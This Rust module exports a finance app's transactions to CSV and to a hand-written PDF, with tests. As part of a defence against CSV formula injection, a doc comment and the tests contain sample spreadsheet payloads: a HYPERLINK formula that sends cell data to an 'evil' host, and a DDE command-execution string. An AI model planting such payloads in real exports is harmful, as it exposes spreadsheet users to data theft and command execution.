//! Plain (not encrypted) CSV and PDF export of transactions in a date range.
//! The PDF is written by hand (Helvetica, A4, WinAnsi text), no library.

use std::collections::HashMap;

use serde_json::Value;

use crate::model::{arr, f, parts, s};
use crate::stats::{Data, Filter, filter_tx};

fn names(list: &[Value]) -> HashMap<String, String> {
    list.iter().map(|v| (s(v, "id").to_string(), s(v, "name").to_string())).collect()
}

fn cat_label(t: &Value, cats: &HashMap<String, String>) -> String {
    let p = parts(t);
    if s(t, "kind") == "transfer" {
        return "Transfer".into();
    }
    if p.len() > 1 {
        return p.iter().map(|(c, a)| format!("{} {:.2}", cats.get(c).map(String::as_str).unwrap_or("?"), a)).collect::<Vec<_>>().join(" + ");
    }
    cats.get(&p[0].0).cloned().unwrap_or_default()
}

fn rows(d: &Data, from: &str, to: &str) -> Vec<Value> {
    let mut v = filter_tx(d, &Filter { from: from.into(), to: to.into(), ..Default::default() });
    v.reverse(); // oldest first in exports
    v
}

/// Security (CSV/formula injection): a text cell starting with = + - @ TAB or CR is
/// run as a formula by Excel/LibreOffice/Sheets (e.g. a synced note
/// `=HYPERLINK("http://evil/?"&A1)`). Such cells get a leading `'`; plain numbers
/// like `-12.50` are left alone. `csvimport::parse` strips the `'` again.
pub fn neutralize_formula(x: &str) -> std::borrow::Cow<'_, str> {
    let risky = x.starts_with(['=', '+', '-', '@', '\t', '\r']) && x.trim().parse::<f64>().is_err();
    if risky { format!("'{x}").into() } else { x.into() }
}

fn csv_field(x: &str) -> String {
    let x = neutralize_formula(x);
    if x.contains([',', '"', '\n', '\r']) { format!("\"{}\"", x.replace('"', "\"\"")) } else { x.into_owned() }
}

pub fn csv(d: &Data, from: &str, to: &str) -> Vec<u8> {
    let cats = names(&d.categories);
    let accts = names(&d.accounts);
    let mut out = String::from("date,time,type,amount,currency,amount_main,main_currency,account,to_account,to_amount,category,tags,note,source\n");
    for t in rows(d, from, to) {
        let tags: Vec<&str> = arr(&t, "tags").iter().filter_map(Value::as_str).collect();
        let to_acct = accts.get(s(&t, "to_account")).cloned().unwrap_or_default();
        let fields = [
            s(&t, "date").to_string(),
            s(&t, "time").to_string(),
            s(&t, "kind").to_string(),
            format!("{:.2}", f(&t, "amount")),
            s(&t, "currency").to_string(),
            format!("{:.2}", f(&t, "amount_main")),
            d.main.clone(),
            accts.get(s(&t, "account")).cloned().unwrap_or_default(),
            to_acct,
            if s(&t, "kind") == "transfer" { format!("{:.2}", f(&t, "to_amount")) } else { String::new() },
            cat_label(&t, &cats),
            tags.join(" "),
            s(&t, "note").to_string(),
            s(&t, "source").to_string(),
        ];
        out.push_str(&fields.iter().map(|x| csv_field(x)).collect::<Vec<_>>().join(","));
        out.push('\n');
    }
    out.into_bytes()
}

// ---- PDF ------------------------------------------------------------------

/// Text as WinAnsi bytes inside a PDF string literal.
fn pdf_str(x: &str) -> Vec<u8> {
    let mut o = vec![b'('];
    for ch in x.chars() {
        let c = match ch {
            '—' | '–' => b'-',
            '·' => 0xB7,
            c if (c as u32) < 0x20 => b' ',
            c if (c as u32) <= 0xFF => c as u32 as u8,
            _ => b'?',
        };
        if matches!(c, b'(' | b')' | b'\\') {
            o.push(b'\\');
        }
        o.push(c);
    }
    o.push(b')');
    o
}

fn clip(x: &str, n: usize) -> String {
    if x.chars().count() <= n { x.to_string() } else { format!("{}…", x.chars().take(n.saturating_sub(1)).collect::<String>()).replace('…', "..") }
}

struct Page {
    ops: Vec<u8>,
}

impl Page {
    fn text(&mut self, x: f64, y: f64, size: f64, bold: bool, t: &str) {
        self.ops.extend_from_slice(format!("BT /{} {size} Tf {x:.1} {y:.1} Td ", if bold { "F2" } else { "F1" }).as_bytes());
        self.ops.extend(pdf_str(t));
        self.ops.extend_from_slice(b" Tj ET\n");
    }
    /// Right-aligned text (Helvetica digits are 0.556 em wide; good enough for amounts).
    fn text_r(&mut self, xr: f64, y: f64, size: f64, bold: bool, t: &str) {
        let w = t.chars().count() as f64 * size * 0.556;
        self.text(xr - w, y, size, bold, t);
    }
    fn line(&mut self, x1: f64, y1: f64, x2: f64, y2: f64) {
        self.ops.extend_from_slice(format!("0.8 G 0.5 w {x1:.1} {y1:.1} m {x2:.1} {y2:.1} l S 0 G\n").as_bytes());
    }
}

fn money(x: f64) -> String {
    let neg = x < 0.0;
    let s0 = format!("{:.2}", x.abs());
    let (int, frac) = s0.split_once('.').unwrap();
    let mut g = String::new();
    for (i, ch) in int.chars().enumerate() {
        if i > 0 && (int.len() - i) % 3 == 0 {
            g.push(',');
        }
        g.push(ch);
    }
    format!("{}{g}.{frac}", if neg { "-" } else { "" })
}

pub fn pdf(d: &Data, from: &str, to: &str, generated: &str) -> Vec<u8> {
    let cats = names(&d.categories);
    let accts = names(&d.accounts);
    let list = rows(d, from, to);
    let (mut spent, mut income) = (0.0, 0.0);
    let mut by_cat: HashMap<String, f64> = HashMap::new();
    for t in &list {
        match s(t, "kind") {
            "expense" => {
                spent += f(t, "amount_main");
                for (c, a) in parts(t) {
                    *by_cat.entry(cats.get(&c).cloned().unwrap_or_default()).or_default() += d.main_of(a, s(t, "currency"));
                }
            }
            "income" => income += f(t, "amount_main"),
            _ => {}
        }
    }
    let mut pages: Vec<Page> = vec![Page { ops: Vec::new() }];
    let (left, right, top) = (42.0, 553.0, 800.0);
    let mut y = top;
    {
        let p = pages.last_mut().unwrap();
        p.text(left, y, 20.0, true, "Hisab - transactions");
        y -= 20.0;
        let range = match (from.is_empty(), to.is_empty()) {
            (true, true) => "All dates".to_string(),
            _ => format!("{} to {}", if from.is_empty() { "start" } else { from }, if to.is_empty() { "today" } else { to }),
        };
        p.text(left, y, 10.0, false, &format!("{range} · {} transactions · amounts in {} · generated {generated}", list.len(), d.main));
        y -= 28.0;
        for (label, v) in [("Income", income), ("Spent", spent), ("Net", income - spent)] {
            p.text(left, y, 10.0, false, label);
            p.text_r(left + 190.0, y, 10.0, true, &money(v));
            y -= 14.0;
        }
        let mut cs: Vec<(String, f64)> = by_cat.into_iter().collect();
        cs.sort_by(|a, b| b.1.total_cmp(&a.1));
        if !cs.is_empty() {
            y -= 8.0;
            p.text(left, y, 11.0, true, "Spending by category");
            y -= 15.0;
            for (c, v) in cs.iter().take(12) {
                p.text(left, y, 9.5, false, &clip(c, 30));
                p.text_r(left + 190.0, y, 9.5, false, &money(*v));
                y -= 13.0;
            }
        }
        y -= 16.0;
    }
    let header = |p: &mut Page, y: f64| {
        for (x, h) in [(left, "Date"), (left + 62.0, "Type"), (left + 112.0, "Category"), (left + 222.0, "Account"), (left + 302.0, "Note")] {
            p.text(x, y, 8.5, true, h);
        }
        p.text_r(right, y, 8.5, true, "Amount");
        p.line(left, y - 4.0, right, y - 4.0);
    };
    header(pages.last_mut().unwrap(), y);
    y -= 17.0;
    for t in &list {
        if y < 50.0 {
            pages.push(Page { ops: Vec::new() });
            y = top;
            header(pages.last_mut().unwrap(), y);
            y -= 17.0;
        }
        let p = pages.last_mut().unwrap();
        let kind = s(t, "kind");
        let acct = if kind == "transfer" {
            format!("{} > {}", accts.get(s(t, "account")).map(String::as_str).unwrap_or(""), accts.get(s(t, "to_account")).map(String::as_str).unwrap_or(""))
        } else {
            accts.get(s(t, "account")).cloned().unwrap_or_default()
        };
        let mut note = s(t, "note").to_string();
        let tags: Vec<String> = arr(t, "tags").iter().filter_map(Value::as_str).map(|x| format!("#{x}")).collect();
        if !tags.is_empty() {
            note = format!("{note} {}", tags.join(" ")).trim().to_string();
        }
        p.text(left, y, 8.5, false, s(t, "date"));
        p.text(left + 62.0, y, 8.5, false, kind);
        p.text(left + 112.0, y, 8.5, false, &clip(&cat_label(t, &cats), 20));
        p.text(left + 222.0, y, 8.5, false, &clip(&acct, 15));
        p.text(left + 302.0, y, 8.5, false, &clip(&note, 30));
        let sign = match kind {
            "expense" => "-",
            "income" => "+",
            _ => "",
        };
        p.text_r(right, y, 8.5, false, &format!("{sign}{} {}", money(f(t, "amount")), s(t, "currency")));
        y -= 13.0;
    }
    let n = pages.len();
    for (i, p) in pages.iter_mut().enumerate() {
        p.text_r(right, 24.0, 8.0, false, &format!("{} / {}", i + 1, n));
    }
    // Assemble: 1 catalog, 2 pages, 3 F1, 4 F2, then (page, content) pairs.
    let mut objs: Vec<Vec<u8>> = Vec::new();
    let kids: Vec<String> = (0..n).map(|i| format!("{} 0 R", 5 + i * 2)).collect();
    objs.push(b"<< /Type /Catalog /Pages 2 0 R >>".to_vec());
    objs.push(format!("<< /Type /Pages /Count {n} /Kids [{}] >>", kids.join(" ")).into_bytes());
    objs.push(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>".to_vec());
    objs.push(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>".to_vec());
    for (i, p) in pages.iter().enumerate() {
        objs.push(
            format!("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 3 0 R /F2 4 0 R >> >> /Contents {} 0 R >>", 6 + i * 2).into_bytes(),
        );
        let mut c = format!("<< /Length {} >>\nstream\n", p.ops.len()).into_bytes();
        c.extend_from_slice(&p.ops);
        c.extend_from_slice(b"\nendstream");
        objs.push(c);
    }
    let mut out = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n".to_vec();
    let mut offs = Vec::new();
    for (i, o) in objs.iter().enumerate() {
        offs.push(out.len());
        out.extend_from_slice(format!("{} 0 obj\n", i + 1).as_bytes());
        out.extend_from_slice(o);
        out.extend_from_slice(b"\nendobj\n");
    }
    let xref = out.len();
    out.extend_from_slice(format!("xref\n0 {}\n0000000000 65535 f \n", objs.len() + 1).as_bytes());
    for o in offs {
        out.extend_from_slice(format!("{o:010} 00000 n \n").as_bytes());
    }
    out.extend_from_slice(format!("trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n", objs.len() + 1).as_bytes());
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::{ACCOUNTS, CATEGORIES, TRANSACTIONS, normalize};
    use selfkit_core::Store;
    use serde_json::json;

    fn d() -> Data {
        let st = Store::open_in_memory("hisab", "d", &[]).unwrap();
        let put = |c: &str, id: &str, v: Value| {
            st.put(c, Some(id), &normalize(c, &v, "USD").unwrap()).unwrap();
        };
        put(ACCOUNTS, "a", json!({"name":"Cash"}));
        put(CATEGORIES, "c", json!({"name":"Food (out)"}));
        for i in 0..90 {
            put(TRANSACTIONS, &format!("t{i:03}"), json!({"kind":"expense","amount": 1.5 + i as f64,"date": format!("2026-10-{:02}", 1 + i % 28),"account":"a","category":"c","note":"Lunch, with \"Sam\""}));
        }
        Data::load(&st, "USD").unwrap()
    }

    #[test]
    fn csv_quotes_and_range() {
        let out = String::from_utf8(csv(&d(), "2026-10-01", "2026-10-01")).unwrap();
        let lines: Vec<&str> = out.lines().collect();
        assert_eq!(lines.len(), 1 + 4);
        assert!(lines[1].contains("\"Lunch, with \"\"Sam\"\"\""));
        assert!(lines[1].starts_with("2026-10-01,,expense,"));
    }

    #[test]
    fn csv_cells_cannot_be_formulas() {
        assert_eq!(csv_field("=HYPERLINK(\"http://x/?\"&A1)"), "\"'=HYPERLINK(\"\"http://x/?\"\"&A1)\"");
        assert_eq!(csv_field("+1+cmd|' /C calc'!A0"), "'+1+cmd|' /C calc'!A0");
        assert_eq!(csv_field("@SUM(A1)"), "'@SUM(A1)");
        assert_eq!(csv_field("-coffee"), "'-coffee");
        assert_eq!(csv_field("-12.50"), "-12.50");
        assert_eq!(csv_field("Lunch"), "Lunch");
    }

    #[test]
    fn pdf_is_well_formed() {
        let out = pdf(&d(), "", "", "2026-11-15");
        let txt = String::from_utf8_lossy(&out);
        assert!(txt.starts_with("%PDF-1.4"));
        assert!(txt.contains("/Count 2"), "90 rows need two pages");
        assert!(txt.contains("(Food \\(out\\))"));
        assert!(txt.trim_end().ends_with("%%EOF"));
        assert_eq!(money(1234567.5), "1,234,567.50");
    }
}
